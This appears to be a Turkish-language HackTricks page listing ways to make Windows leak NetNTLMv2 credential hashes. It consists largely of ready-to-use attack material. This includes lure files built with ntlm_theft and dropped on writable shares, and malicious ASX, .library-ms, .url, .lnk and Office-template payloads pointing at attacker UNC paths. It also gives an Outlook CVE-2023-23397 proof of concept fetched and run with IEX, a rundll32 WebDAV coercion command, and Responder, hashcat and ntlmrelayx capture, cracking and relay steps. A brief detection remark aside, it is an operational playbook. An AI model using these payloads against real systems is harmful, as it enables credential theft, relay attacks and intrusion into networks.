# NTLM creds çalınacak yerler

{{#include ../../banners/hacktricks-training.md}}

**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ adresindeki tüm harika fikirleri, çevrimiçi bir microsoft word dosyasının indirilmesinden ntlm leak kaynaklarına kadar inceleyin: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Yazılabilir SMB share + Explorer tetiklemeli UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Eğer **Explorer’da kullanıcıların veya scheduled jobs’ın gezindiği bir share’e yazabiliyorsanız**, metadata’sı sizin UNC’nize işaret eden dosyalar bırakın (örn. `\\ATTACKER\share`). Klasörün render edilmesi **implicit SMB authentication** tetikler ve listener’ınıza bir **NetNTLMv2** sızdırır.

1. **Lures üretin** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. kapsar)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Yazılabilir share üzerine bırakın** (kurbanın açtığı herhangi bir klasör):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Dinle ve crack et**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows aynı anda birden fazla dosyaya çarpabilir; Explorer’ın önizlediği her şey (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player playlist’leri (.ASX/.WAX)

Eğer bir hedefi kontrol ettiğiniz bir Windows Media Player playlist’ini açmaya veya önizlemeye ikna edebilirseniz, girdiyi bir UNC path’e yönlendirerek Net‑NTLMv2 leak yapabilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışır ve otomatik olarak authenticate olur.

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve cracking akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, .library-ms dosyalarını bir ZIP arşivinin içinden doğrudan açıldıklarında güvensiz şekilde işler. Eğer library definition uzak bir UNC path’e (örn. \\attacker\share) işaret ediyorsa, .library-ms dosyasını ZIP içinde yalnızca gezinmek/başlatmak Explorer’ın UNC’yi enumerate etmesine ve saldırgana NTLM authentication göndermesine neden olur. Bu, offline olarak crack edilebilen veya potansiyel olarak relay yapılabilen bir NetNTLMv2 elde edilmesini sağlar.

Saldırgan bir UNC’ye işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyon adımları
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname adresinizi ayarlayın).
- Zipleyin (Windows’ta: Send to → Compressed (zipped) folder) ve ZIP’i hedefe teslim edin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içindeki .library-ms dosyasını açmasını bekleyin.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows, calendar items içindeki extended MAPI property PidLidReminderFileParameter’ı işliyordu. Eğer bu property bir UNC path’e işaret ederse (örn. \\attacker\share\alert.wav), reminder tetiklendiğinde Outlook SMB share ile bağlantı kurar ve herhangi bir click olmadan kullanıcının Net‑NTLMv2 bilgisini leak ederdi. Bu açık 14 Mart 2023’te patched edildi, ancak legacy/untouched fleets ve historical incident response için hâlâ çok relevant.

PowerShell ile hızlı exploitation (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Dinleyici tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Bir kurbanın, hatırlatıcı tetiklendiğinde yalnızca Windows için Outlook çalışıyor olması gerekir.
- leak, offline cracking veya relay için uygun Net‑NTLMv2 üretir (pass‑the‑hash değil).


### .LNK/.URL simge tabanlı zero‑click NTLM leak (CVE-2025-50154 – CVE-2025-24054 bypass’ı)

Windows Explorer, shortcut simgelerini otomatik olarak render eder. Son araştırmalar, UNC-icon shortcut’ları için Microsoft’un Nisan 2025 patch’inden sonra bile, shortcut hedefini bir UNC path üzerinde barındırıp simgeyi local tutarak NTLM authentication’ı tıklama olmadan tetiklemenin hâlâ mümkün olduğunu gösterdi (patch bypass’a CVE-2025-50154 atanmıştır). Sadece klasörü görüntülemek, Explorer’ın remote hedeften metadata almasına neden olur ve attacker SMB server’ına NTLM gönderir.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell üzerinden Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery fikirleri
- Kısayolu bir ZIP içine koyup kurbana açtırın.
- Kısayolu, kurbanın açacağı writable share üzerine yerleştirin.
- Aynı klasördeki diğer lure dosyalarıyla birleştirip Explorer’ın öğeleri önizlemesini sağlayın.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows, `.lnk` metadata’sını yalnızca execution sırasında değil, **view/preview** (icon rendering) sırasında da yükler. CVE‑2026‑25185, **ExtraData** bloklarının shell’in bir icon path çözümlemesine ve yükleme **sırasında** filesystem’e dokunmasına yol açtığı bir parsing path gösterir; path remote ise outbound NTLM üretir.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- ExtraData içinde **DARWIN_PROPS** (`0xa0000006`) include edin (icon update routine için gate).
- **TargetUnicode** doldurulmuş şekilde **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) include edin.
- Loader, `TargetUnicode` içindeki environment variables’ı expand eder ve resulting path üzerinde `PathFileExistsW` çağırır.

Eğer `TargetUnicode` bir UNC path’e çözülürse (ör. `\\attacker\share\icon.ico`), yalnızca kısayolun bulunduğu bir klasörü **görmek** bile outbound authentication’a neden olur. Aynı load path, **indexing** ve **AV scanning** sırasında da tetiklenebilir; bu da onu pratik bir no-click leak surface yapar.

Bu yapıların Windows GUI kullanmadan oluşturulması/incelemesi için **LnkMeMaybe** projesinde research tooling (parser/generator/UI) mevcuttur.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Native **WebDAV client**, mevcut logon session’ı keyfi bir **HTTP/WebDAV** endpoint’ine authenticate etmeye zorlamak için abuse edilebilir:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Bu neden faydalı:
- **Saldırgan tarafından kontrol edilen bir WebDAV server** karşısında, özel bir client düşürmeden **HTTP üzerinden NTLM** tetikleyebilir.
- **Internal hostlar** karşısında, laterally hareket etmeden önce **çalınan credentials’ın nerede kabul edildiğini doğrulamak** için sessiz bir yoldur.
- Bu command, **SMB egress filtrelenmiş** ama **HTTP/WebDAV** hâlâ erişilebilir olduğunda iyi bir alternatiftir.

Operational notlar:
- **WebClient** service, source host üzerinde çalışıyor olmalıdır.
- `rundll32.exe`, `davclnt.dll` yükler ve Windows’un WebDAV authentication işlemini **current user's credentials** ile yapmasını sağlar.
- Bunu kontrol ettiğiniz bir infrastructure’a yönlendirirseniz, NTLM-aware bir HTTP listener/relay kullanın, örneğin:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Detection açısından bakıldığında, birçok dahili sisteme karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **credential validation / spray-like lateral movement hazırlığı** için güçlü bir sinyaldir.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office belgeleri harici bir template’e başvurabilir. Attached template’i bir UNC path’e ayarlarsanız, belgeyi açmak SMB üzerinden authentication başlatır.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml ve attached template reference’ını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337 değerini UNC’nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx olarak yeniden paketleyip teslim edin. SMB capture listener’ınızı çalıştırın ve open için bekleyin.

NTLM’yi relay etmek veya abuse etmek için capture sonrası fikirler için şuna bakın:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
